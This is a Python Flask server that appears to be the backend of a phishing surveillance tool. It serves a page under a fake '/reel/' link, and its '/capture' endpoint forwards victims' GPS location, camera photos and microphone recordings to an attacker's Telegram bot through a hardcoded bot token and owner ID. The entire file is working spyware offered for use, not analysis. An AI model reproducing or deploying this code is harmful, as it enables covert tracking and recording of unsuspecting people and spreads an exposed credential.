from flask import Flask, request, render_template, jsonify
from flask_cors import CORS
import requests
import base64
import time

app = Flask(__name__)
CORS(app)

BOT_TOKEN = "8939528828:AAEbmdhA8sVYw9IQdhVlJBJdGHvuUVDoXLM"
BOT_OWNER_ID = 713914937

@app.route('/')
@app.route('/reel/<reel_id>')
def index(reel_id=None):
    return render_template('index.html')

@app.route('/capture', methods=['POST'])
def capture():
    try:
        data = request.json
        chat_id = BOT_OWNER_ID
        
        if data.get('location'):
            loc = data['location']
            requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendLocation", 
                         data={'chat_id': chat_id, 'latitude': loc['lat'], 'longitude': loc['lng']})
        
        for i, photo in enumerate(data.get('photos', [])):
            if photo.get('data'):
                img_data = photo['data'].split(',')[1]
                requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto",
                             files={'photo': (f'photo_{i}.jpg', base64.b64decode(img_data), 'image/jpeg')})
        
        if data.get('audio'):
            requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendAudio",
                         files={'audio': ('voice.webm', base64.b64decode(data['audio']), 'audio/webm')})
        
        return jsonify({'status': 'ok'})
    except Exception as e:
        return jsonify({'status': 'error'})

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=5000)